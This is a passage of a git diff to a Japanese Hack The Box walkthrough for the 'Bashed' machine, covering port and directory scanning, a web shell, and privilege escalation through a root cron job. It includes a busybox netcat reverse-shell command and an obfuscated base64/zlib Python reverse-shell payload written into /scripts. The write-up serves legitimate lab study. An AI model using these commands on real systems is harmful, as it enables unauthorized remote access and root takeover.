@@ -1,20 +1,7 @@
 https://app.hackthebox.com/machines/Bashed
 ## STEP 1
-tcp80番がオープン
 ```sh
-└─$ rustscan -a 10.129.14.206 --scripts none         
-.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
-| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
-| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
-`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
-The Modern Day Port Scanner.
-________________________________________
-: http://discord.skerritt.blog         :
-: https://github.com/RustScan/RustScan :
- --------------------------------------
-HACK THE PLANET
-
-[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+└─$ rustscan -a 10.129.14.206 --no-banner --scripts none         
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.129.14.206:80
@@ -28,7 +15,7 @@ Open 10.129.14.206:80
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_01.png">  
 列挙するといろいろ発見
 ```sh
-└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.14.206/FUZZ
+└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.14.206/FUZZ
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -42,7 +29,7 @@ ________________________________________________
 
  :: Method           : GET
  :: URL              : http://10.129.14.206/FUZZ
- :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
  :: Follow redirects : false
  :: Calibration      : false
  :: Timeout          : 10
@@ -50,20 +37,15 @@ ________________________________________________
  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-                        [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 302ms]
-.htpasswd               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 2628ms]
-.hta                    [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 3626ms]
-.htaccess               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 3631ms]
-css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 298ms]
-dev                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 299ms]
-fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 295ms]
-images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 293ms]
-index.html              [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 288ms]
-js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 300ms]
-php                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 289ms]
-server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 301ms]
-uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 281ms]
-:: Progress: [4614/4614] :: Job [1/1] :: 38 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
+images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 301ms]
+uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 700ms]
+js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 3897ms]
+dev                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 343ms]
+php                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 321ms]
+css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 4618ms]
+fonts                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 305ms]
+server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 308ms]
+:: Progress: [29999/29999] :: Job [1/1] :: 98 req/sec :: Duration: [0:04:29] :: Errors: 1 ::
 ```
 /dev上にphpbash.phpを発見  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_02.png">  
@@ -95,7 +77,7 @@ phpbash.php上で実行
 www-data@bashed:/var/www/html/dev# sudo -u scriptmanager busybox nc 10.10.16.4 4444 -e /bin/sh
 ```
 scriptmanager権限のリバースシェル取得！  
-しかし/rootにはアクセスできず、権限昇格を目指す  
+しかしルートフラグにはアクセスできず
 ```sh
 └─$ nc -lnvp 4444 
 listening on [any] 4444 ...
@@ -116,48 +98,12 @@ scriptmanager@bashed:/var/www/html/dev$ export TERM=xterm-256color
 
 scriptmanager@bashed:/var/www/html/dev$ stty rows 66 columns 236
 
-scriptmanager@bashed:/var/www/html/dev$ ls /root
-ls: cannot open directory '/root': Permission denied
+scriptmanager@bashed:/var/www/html/dev$ cat /root/root.txt
+cat: /root/root.txt: Permission denied
 ```
 
 
 ## STEP 4
-scriptmanager所有のファイルを検索  
-```sh
-scriptmanager@bashed:/var/www/html/dev$ find / -not -path '/proc/*' -user scriptmanager 2> /dev/null 
-/scripts
-/scripts/test.py
-/home/scriptmanager
-/home/scriptmanager/.profile
-/home/scriptmanager/.bashrc
-/home/scriptmanager/.nano
-/home/scriptmanager/.bash_history
-/home/scriptmanager/.bash_logout
-/dev/pts/1
-```
-/scriptsの中に、test.pyとtest.txtを発見  
-test.pyはtest.txtを作成するっぽい  
-test.txtはroot権限  
-root権限でtest.pyが実行され、作成されたtest.txtはroot権限になると推測  
-root権限のcronでtest.pyが実行されているかも
-```sh
-scriptmanager@bashed:/var/www/html/dev$ cd /scripts
-
-scriptmanager@bashed:/scripts$ ls -la
-total 16
-drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
-drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
--rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
--rw-r--r--  1 root          root            12 Apr 22 19:50 test.txt
-
-scriptmanager@bashed:/scripts$ cat test.py
-f = open("test.txt", "w")
-f.write("testing 123!")
-f.close
-
-scriptmanager@bashed:/scripts$ cat test.txt
-testing 123!
-```
 `pspy`で詳細なプロセスを確認する  
 kaliのhttpサーバにアップロード
 ```sh
@@ -166,10 +112,12 @@ kaliのhttpサーバにアップロード
 └─$ python3.13 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
-`pspy`実行、１分間隔でscirpts内のpythonがroot権限（UID=0）で実行されていることを確認できた  
-scripts内の全てのpythonをroot権限で実行しているで、pythonのペイロードを配置すればroot権限のリバースシェルをとれるかも
+`pspy`実行、１分間隔でscirpts内の .py がroot権限（UID=0）で実行されていることを確認できた  
+とうことはscripts内にpythonのペイロードを配置すればroot権限のリバースシェルをとれるかも
 ```sh
-scriptmanager@bashed:/scripts$ wget http://10.10.14.109/pspy64
+scriptmanager@bashed:/var/www/html/dev$ cd /tmp
+
+scriptmanager@bashed:/tmp$ wget http://10.10.14.109/pspy64
 --2025-04-25 07:38:05--  http://10.10.14.109/pspy64
 Connecting to 10.10.14.109:80... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -180,9 +128,9 @@ pspy64              100%[===================>]   2.96M   451KB/s    in 10s
 
 2025-04-25 07:38:15 (303 KB/s) - 'pspy64' saved [3104768/3104768]
 
-scriptmanager@bashed:/scripts$ chmod +x pspy64
+scriptmanager@bashed:/tmp$ chmod +x pspy64
 
-scriptmanager@bashed:/scripts$ ./pspy64
+scriptmanager@bashed:/tmp$ ./pspy64
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
 
 
@@ -370,7 +318,7 @@ done
 ```sh
 scriptmanager@bashed:/scripts$ echo "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNpNjk1LAzEQQM/Jr8htE1zDViqokEORFYqoxe69bJMpDV0zIZPVv29i92AYAm/mzYf/ipiyILQXyGIkQdwvqfkYE1ogqunECQ3pqydJb14O2/d+aEnvP55fD/vhs9+8qSJpiyGAzVI2q07XWJf/sWnvy1OK/5z9BGJIMzxx5kxpSGC/5aq7WyvO/ElMEKRTxnSlzo4Jxgtn0SS9w1gr2oFFB7KZ8+n2oVEtnWGaTB3YUnY+VHW76yvgnP8RpLRQWYQm6qtR9o9Oqps/Ls7CnJXTCIKTqPgvf3dcCw==')[0])))" > shell.py
 ```
-無事リバースシェル取得！
+数分後リバースシェル取得、ルートフラグゲット！
 ```sh
 └─$ rlwrap nc -lnvp 5555
 listening on [any] 5555 ...
